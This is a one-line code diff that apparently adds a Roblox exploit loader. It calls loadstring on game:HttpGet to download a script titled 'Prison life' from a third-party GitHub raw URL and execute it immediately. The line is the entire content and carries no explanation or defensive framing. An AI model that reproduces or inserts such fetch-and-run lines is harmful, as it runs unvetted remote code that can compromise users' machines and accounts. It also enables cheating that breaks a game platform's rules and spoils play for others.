@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BirthScripts/Scripts/main/Prison%20life'))()
